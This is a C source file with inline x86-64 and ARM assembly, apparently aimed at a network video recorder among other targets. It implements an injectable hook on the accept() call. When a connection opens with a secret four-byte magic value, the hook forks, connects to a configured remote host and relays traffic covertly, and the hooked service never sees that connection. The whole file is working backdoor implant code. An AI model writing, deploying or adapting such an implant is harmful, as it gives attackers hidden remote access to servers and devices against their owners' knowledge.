#include "hook/accept_hook.h"

/* ================================================================== */
/* x86-64                                                              */
/* ================================================================== */
#if defined(__x86_64__)

/*
 * Stack frame allocated with sub rsp, 2048:
 *   rsp+0    peek buf       (4 bytes)
 *   rsp+16   sockaddr_in    (16 bytes)
 *   rsp+128  fd_set rfds    (128 bytes; requires fd < 64)
 *   rsp+512  relay buffer   (1400 bytes)
 *
 * Callee-saved register map:
 *   rbx = sockfd (accept arg 0)     r14 = local fd (accept return value)
 *   r12 = addr   (accept arg 1)     r13 = remote fd (child only)
 *   r13 = addrlen (accept arg 2)    r15 = config pointer
 */
__attribute__((naked, section(".text.hook")))
void hook_accept(void)
{
    __asm__ volatile(
        /* prologue */
        "push %%rbp\n\t"
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"

        "movq %%rdi, %%rbx\n\t"
        "movq %%rsi, %%r12\n\t"
        "movq %%rdx, %%r13\n\t"

        /* load config pointer — placeholder patched to page+0x400 */
        "movabs $0xDEADBEEFCAFEBABE, %%r15\n\t"

        /* call real accept() via config->real_accept */
        "movq 0(%%r15), %%rax\n\t"
        "movq %%rbx, %%rdi\n\t"
        "movq %%r12, %%rsi\n\t"
        "movq %%r13, %%rdx\n\t"
        "call *%%rax\n\t"
        "movq %%rax, %%r14\n\t"

        "testq %%r14, %%r14\n\t"
        "js .Lreturn_fd\n\t"

        "subq $2048, %%rsp\n\t"

        /* recvfrom(fd, rsp, 4, MSG_PEEK|MSG_DONTWAIT=0x42, NULL, NULL) */
        "movq $45, %%rax\n\t"
        "movq %%r14, %%rdi\n\t"
        "movq %%rsp, %%rsi\n\t"
        "movq $4, %%rdx\n\t"
        "movq $0x02, %%r10\n\t"     /* MSG_PEEK — block until 4 bytes arrive */
        "xorq %%r8, %%r8\n\t"
        "xorq %%r9, %%r9\n\t"
        "syscall\n\t"

        "cmpq $4, %%rax\n\t"
        "jne .Lrestore_return_fd\n\t"

        /* compare peeked bytes with config->magic at [r15+0x10] */
        "movl (%%rsp), %%eax\n\t"
        "cmpl 0x10(%%r15), %%eax\n\t"
        "jne .Lrestore_return_fd\n\t"

        /* fork */
        "movq $57, %%rax\n\t"
        "syscall\n\t"
        "testq %%rax, %%rax\n\t"
        "jnz .Lparent\n\t"

        /* ==== CHILD ==== */

        /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
        "movq $41, %%rax\n\t"
        "movq $2,  %%rdi\n\t"
        "movq $1,  %%rsi\n\t"
        "xorq %%rdx, %%rdx\n\t"
        "syscall\n\t"
        "movq %%rax, %%r13\n\t"
        "testq %%r13, %%r13\n\t"
        "js .Lchild_exit\n\t"

        /* build sockaddr_in at rsp+16 */
        "movq $0, 16(%%rsp)\n\t"
        "movq $0, 24(%%rsp)\n\t"
        "movw $2, 16(%%rsp)\n\t"            /* sin_family = AF_INET */
        "movzwl 0xc(%%r15), %%ecx\n\t"      /* config->remote_port  */
        "movw %%cx, 18(%%rsp)\n\t"
        "movl 0x8(%%r15), %%ecx\n\t"        /* config->remote_ip    */
        "movl %%ecx, 20(%%rsp)\n\t"

        /* connect(remote_fd, &sockaddr_in, 16) */
        "movq $42, %%rax\n\t"
        "movq %%r13, %%rdi\n\t"
        "leaq 16(%%rsp), %%rsi\n\t"
        "movq $16, %%rdx\n\t"
        "syscall\n\t"
        "testq %%rax, %%rax\n\t"
        "js .Lchild_exit\n\t"

        /* ==== relay loop: r14=local_fd, r13=remote_fd ==== */
        ".Lrelay_loop:\n\t"

        /* FD_ZERO 128 bytes at rsp+128 */
        "movq $0, 128(%%rsp)\n\t"  "movq $0, 136(%%rsp)\n\t"
        "movq $0, 144(%%rsp)\n\t"  "movq $0, 152(%%rsp)\n\t"
        "movq $0, 160(%%rsp)\n\t"  "movq $0, 168(%%rsp)\n\t"
        "movq $0, 176(%%rsp)\n\t"  "movq $0, 184(%%rsp)\n\t"
        "movq $0, 192(%%rsp)\n\t"  "movq $0, 200(%%rsp)\n\t"
        "movq $0, 208(%%rsp)\n\t"  "movq $0, 216(%%rsp)\n\t"
        "movq $0, 224(%%rsp)\n\t"  "movq $0, 232(%%rsp)\n\t"
        "movq $0, 240(%%rsp)\n\t"  "movq $0, 248(%%rsp)\n\t"

        /* FD_SET(r14) — fd assumed < 64 */
        "movq $1, %%rax\n\t"
        "movq %%r14, %%rcx\n\t"
        "shlq %%cl, %%rax\n\t"
        "orq  %%rax, 128(%%rsp)\n\t"

        /* FD_SET(r13) */
        "movq $1, %%rax\n\t"
        "movq %%r13, %%rcx\n\t"
        "shlq %%cl, %%rax\n\t"
        "orq  %%rax, 128(%%rsp)\n\t"

        /* nfds = max(r14, r13) + 1 */
        "movq %%r14, %%rdi\n\t"
        "cmpq %%r14, %%r13\n\t"
        "jle .Luse_r14\n\t"
        "movq %%r13, %%rdi\n\t"
        ".Luse_r14:\n\t"
        "incq %%rdi\n\t"

        /* select(nfds, &rfds, NULL, NULL, NULL) */
        "movq $23, %%rax\n\t"
        "leaq 128(%%rsp), %%rsi\n\t"
        "xorq %%rdx, %%rdx\n\t"
        "xorq %%r10, %%r10\n\t"
        "xorq %%r8,  %%r8\n\t"
        "syscall\n\t"
        "testq %%rax, %%rax\n\t"
        "jle .Lrelay_done\n\t"

        /* FD_ISSET(r14) */
        "movq $1, %%rax\n\t"
        "movq %%r14, %%rcx\n\t"
        "shlq %%cl, %%rax\n\t"
        "movq 128(%%rsp), %%rbx\n\t"
        "testq %%rax, %%rbx\n\t"
        "jz .Lcheck_remote\n\t"

        /* recv from local → relay buf at rsp+512 */
        "movq $45, %%rax\n\t"
        "movq %%r14, %%rdi\n\t"
        "leaq 512(%%rsp), %%rsi\n\t"
        "movq $1400, %%rdx\n\t"
        "xorq %%r10, %%r10\n\t"
        "xorq %%r8,  %%r8\n\t"
        "xorq %%r9,  %%r9\n\t"
        "syscall\n\t"
        "testq %%rax, %%rax\n\t"
        "jle .Lrelay_done\n\t"

        /* send to remote */
        "movq %%rax, %%rdx\n\t"
        "movq $44, %%rax\n\t"
        "movq %%r13, %%rdi\n\t"
        "leaq 512(%%rsp), %%rsi\n\t"
        "xorq %%r10, %%r10\n\t"
        "xorq %%r8,  %%r8\n\t"
        "xorq %%r9,  %%r9\n\t"
        "syscall\n\t"

        ".Lcheck_remote:\n\t"
        /* FD_ISSET(r13) */
        "movq $1, %%rax\n\t"
        "movq %%r13, %%rcx\n\t"
        "shlq %%cl, %%rax\n\t"
        "movq 128(%%rsp), %%rbx\n\t"
        "testq %%rax, %%rbx\n\t"
        "jz .Lrelay_loop\n\t"

        /* recv from remote → relay buf */
        "movq $45, %%rax\n\t"
        "movq %%r13, %%rdi\n\t"
        "leaq 512(%%rsp), %%rsi\n\t"
        "movq $1400, %%rdx\n\t"
        "xorq %%r10, %%r10\n\t"
        "xorq %%r8,  %%r8\n\t"
        "xorq %%r9,  %%r9\n\t"
        "syscall\n\t"
        "testq %%rax, %%rax\n\t"
        "jle .Lrelay_done\n\t"

        /* send to local */
        "movq %%rax, %%rdx\n\t"
        "movq $44, %%rax\n\t"
        "movq %%r14, %%rdi\n\t"
        "leaq 512(%%rsp), %%rsi\n\t"
        "xorq %%r10, %%r10\n\t"
        "xorq %%r8,  %%r8\n\t"
        "xorq %%r9,  %%r9\n\t"
        "syscall\n\t"

        "jmp .Lrelay_loop\n\t"

        ".Lrelay_done:\n\t"
        "movq $3, %%rax\n\t"            /* SYS_close(local_fd) */
        "movq %%r14, %%rdi\n\t"
        "syscall\n\t"
        "movq $3, %%rax\n\t"            /* SYS_close(remote_fd) */
        "movq %%r13, %%rdi\n\t"
        "syscall\n\t"

        ".Lchild_exit:\n\t"
        "movq $60, %%rax\n\t"           /* SYS_exit(0) */
        "xorq %%rdi, %%rdi\n\t"
        "syscall\n\t"

        /* ==== PARENT ==== */
        ".Lparent:\n\t"
        "addq $2048, %%rsp\n\t"
        "movq $3, %%rax\n\t"            /* SYS_close: child owns the fd now */
        "movq %%r14, %%rdi\n\t"
        "syscall\n\t"
        /* re-enter real accept with the original arguments so the next
         * connection surfaces at this call site rather than returning -1 */
        "movq 0(%%r15), %%rax\n\t"
        "movq %%rbx, %%rdi\n\t"
        "movq %%r12, %%rsi\n\t"
        "movq %%r13, %%rdx\n\t"
        "call *%%rax\n\t"
        "movq %%rax, %%r14\n\t"
        "jmp .Lreturn_fd\n\t"

        ".Lrestore_return_fd:\n\t"
        "addq $2048, %%rsp\n\t"

        ".Lreturn_fd:\n\t"
        "movq %%r14, %%rax\n\t"
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        "ret\n\t"

        ".globl hook_accept_end\n\t"
        "hook_accept_end:\n\t"
        :::
    );
}

/* ================================================================== */
/* ARM 32-bit (ARMv7 / NVR302-32S kernel 3.18)                        */
/* ================================================================== */
#elif defined(__arm__)

/*
 * Stack frame allocated with sub sp, sp, #2048:
 *   sp+0    peek buf       (4 bytes)
 *   sp+16   sockaddr_in    (16 bytes)
 *   sp+128  fd_set rfds    (128 bytes; requires fd < 32)
 *   sp+512  relay buffer   (1400 bytes)
 *
 * Registers:
 *   r4=sockfd  r5=addr  r6=addrlen
 *   r9=local_fd  r10=config ptr  r11=remote_fd (child)
 *
 * Syscall numbers (ARM EABI, kernel 3.18):
 *   exit=1  fork=2  close=6  _newselect=142
 *   socket=281  connect=283  sendto=290  recvfrom=292
 */
#ifdef __arm__
__attribute__((naked, section(".text.hook"), target("arm")))
#else
__attribute__((naked, section(".text.hook")))
#endif
void hook_accept(void)
{
    __asm__ volatile(
        ".arm\n\t"
        "push {r4-r11, lr}\n\t"

        "mov r4, r0\n\t"
        "mov r5, r1\n\t"
        "mov r6, r2\n\t"

        /* load config pointer from literal pool */
        "ldr r10, .Larm_config_magic\n\t"

        /* call real accept via config->real_accept (low 32 bits at [r10+0]) */
        "ldr r3, [r10, #0]\n\t"
        "mov r0, r4\n\t"
        "mov r1, r5\n\t"
        "mov r2, r6\n\t"
        "blx r3\n\t"
        "mov r9, r0\n\t"

        "cmp r9, #0\n\t"
        "blt .Larm_return_fd\n\t"

        "sub sp, sp, #2048\n\t"

        /* recvfrom(r9, sp, 4, 0x42, NULL, NULL) */
        "ldr r7, =292\n\t"
        "mov r0, r9\n\t"
        "mov r1, sp\n\t"
        "mov r2, #4\n\t"
        "mov r3, #0x02\n\t"         /* MSG_PEEK — block until 4 bytes arrive */
        "mov r4, #0\n\t"
        "mov r5, #0\n\t"
        "svc #0\n\t"

        "cmp r0, #4\n\t"
        "bne .Larm_restore_return_fd\n\t"

        /* compare peeked bytes with config->magic at [r10+0x10] */
        "ldr r0, [sp, #0]\n\t"
        "ldr r1, [r10, #0x10]\n\t"
        "cmp r0, r1\n\t"
        "bne .Larm_restore_return_fd\n\t"

        /* fork */
        "mov r7, #2\n\t"
        "svc #0\n\t"
        "cmp r0, #0\n\t"
        "bne .Larm_parent\n\t"

        /* ==== CHILD ==== */

        /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
        "ldr r7, =281\n\t"
        "mov r0, #2\n\t"
        "mov r1, #1\n\t"
        "mov r2, #0\n\t"
        "svc #0\n\t"
        "mov r11, r0\n\t"
        "cmp r11, #0\n\t"
        "blt .Larm_child_exit\n\t"

        /* build sockaddr_in at sp+16 */
        "mov r0, #0\n\t"
        "str r0, [sp, #16]\n\t"
        "str r0, [sp, #20]\n\t"
        "str r0, [sp, #24]\n\t"
        "str r0, [sp, #28]\n\t"
        "mov r0, #2\n\t"
        "strh r0, [sp, #16]\n\t"       /* sin_family = AF_INET */
        "ldrh r0, [r10, #0xc]\n\t"     /* config->remote_port  */
        "strh r0, [sp, #18]\n\t"
        "ldr  r0, [r10, #0x8]\n\t"     /* config->remote_ip    */
        "str  r0, [sp, #20]\n\t"

        /* connect(r11, sp+16, 16) */
        "ldr r7, =283\n\t"
        "mov r0, r11\n\t"
        "add r1, sp, #16\n\t"
        "mov r2, #16\n\t"
        "svc #0\n\t"
        "cmp r0, #0\n\t"
        "blt .Larm_child_exit\n\t"

        /* ==== relay loop: r9=local_fd, r11=remote_fd ==== */
        ".Larm_relay_loop:\n\t"

        /* FD_ZERO 128 bytes at sp+128 */
        "mov r0, #0\n\t"
        "add r1, sp, #128\n\t"
        "mov r2, #32\n\t"
        ".Larm_fdzero:\n\t"
        "str r0, [r1], #4\n\t"
        "subs r2, r2, #1\n\t"
        "bne .Larm_fdzero\n\t"

        /* FD_SET(r9) — fd assumed < 32 */
        "mov r0, #1\n\t"
        "mov r0, r0, lsl r9\n\t"
        "ldr r1, [sp, #128]\n\t"
        "orr r1, r1, r0\n\t"
        "str r1, [sp, #128]\n\t"

        /* FD_SET(r11) */
        "mov r0, #1\n\t"
        "mov r0, r0, lsl r11\n\t"
        "ldr r1, [sp, #128]\n\t"
        "orr r1, r1, r0\n\t"
        "str r1, [sp, #128]\n\t"

        /* nfds = max(r9, r11) + 1 */
        "cmp r9, r11\n\t"
        "movge r0, r9\n\t"
        "movlt r0, r11\n\t"
        "add r0, r0, #1\n\t"

        /* _newselect(nfds, &rfds, NULL, NULL, NULL) */
        "mov r7, #142\n\t"
        "add r1, sp, #128\n\t"
        "mov r2, #0\n\t"
        "mov r3, #0\n\t"
        "mov r4, #0\n\t"
        "svc #0\n\t"
        "cmp r0, #0\n\t"
        "ble .Larm_relay_done\n\t"

        /* FD_ISSET(r9) */
        "mov r0, #1\n\t"
        "mov r0, r0, lsl r9\n\t"
        "ldr r1, [sp, #128]\n\t"
        "tst r1, r0\n\t"
        "beq .Larm_check_remote\n\t"

        /* recv from local → sp+512 */
        "ldr r7, =292\n\t"
        "mov r0, r9\n\t"
        "add r1, sp, #512\n\t"
        "ldr r2, =1400\n\t"
        "mov r3, #0\n\t"
        "mov r4, #0\n\t"
        "mov r5, #0\n\t"
        "svc #0\n\t"
        "cmp r0, #0\n\t"
        "ble .Larm_relay_done\n\t"

        /* sendto remote */
        "mov r6, r0\n\t"
        "ldr r7, =290\n\t"
        "mov r0, r11\n\t"
        "add r1, sp, #512\n\t"
        "mov r2, r6\n\t"
        "mov r3, #0\n\t"
        "mov r4, #0\n\t"
        "mov r5, #0\n\t"
        "svc #0\n\t"

        ".Larm_check_remote:\n\t"
        /* FD_ISSET(r11) */
        "mov r0, #1\n\t"
        "mov r0, r0, lsl r11\n\t"
        "ldr r1, [sp, #128]\n\t"
        "tst r1, r0\n\t"
        "beq .Larm_relay_loop\n\t"

        /* recv from remote → sp+512 */
        "ldr r7, =292\n\t"
        "mov r0, r11\n\t"
        "add r1, sp, #512\n\t"
        "ldr r2, =1400\n\t"
        "mov r3, #0\n\t"
        "mov r4, #0\n\t"
        "mov r5, #0\n\t"
        "svc #0\n\t"
        "cmp r0, #0\n\t"
        "ble .Larm_relay_done\n\t"

        /* sendto local */
        "mov r6, r0\n\t"
        "ldr r7, =290\n\t"
        "mov r0, r9\n\t"
        "add r1, sp, #512\n\t"
        "mov r2, r6\n\t"
        "mov r3, #0\n\t"
        "mov r4, #0\n\t"
        "mov r5, #0\n\t"
        "svc #0\n\t"

        "b .Larm_relay_loop\n\t"

        ".Larm_relay_done:\n\t"
        "mov r7, #6\n\t"                /* NR_close(local_fd) */
        "mov r0, r9\n\t"
        "svc #0\n\t"
        "mov r7, #6\n\t"                /* NR_close(remote_fd) */
        "mov r0, r11\n\t"
        "svc #0\n\t"

        ".Larm_child_exit:\n\t"
        "mov r7, #1\n\t"                /* NR_exit(0) */
        "mov r0, #0\n\t"
        "svc #0\n\t"

        /* ==== PARENT ==== */
        ".Larm_parent:\n\t"
        "add sp, sp, #2048\n\t"
        "mov r7, #6\n\t"                /* NR_close: child owns the fd */
        "mov r0, r9\n\t"
        "svc #0\n\t"
        /* re-enter real accept using original sockfd/addr/addrlen saved on
         * the stack by the entry push — after add sp,#2048 they are at sp+0/4/8 */
        "ldr r0, [sp, #0]\n\t"         /* original sockfd (saved r4) */
        "ldr r1, [sp, #4]\n\t"         /* original addr   (saved r5) */
        "ldr r2, [sp, #8]\n\t"         /* original addrlen (saved r6) */
        "ldr r3, [r10, #0]\n\t"        /* config->real_accept */
        "blx r3\n\t"
        "mov r9, r0\n\t"
        "b .Larm_return_fd\n\t"

        ".Larm_restore_return_fd:\n\t"
        "add sp, sp, #2048\n\t"

        ".Larm_return_fd:\n\t"
        "mov r0, r9\n\t"
        "pop {r4-r11, pc}\n\t"

        ".balign 4\n\t"
        ".Larm_config_magic: .word 0xDEADBEEF\n\t"  /* HOOK_CONFIG_MAGIC placeholder */
        ".ltorg\n\t"                    /* flush ldr r, =val literal pool */

        ".globl hook_accept_end\n\t"
        "hook_accept_end:\n\t"
        :::
    );
}

#else
#  error "hook/accept_hook: unsupported architecture"
#endif
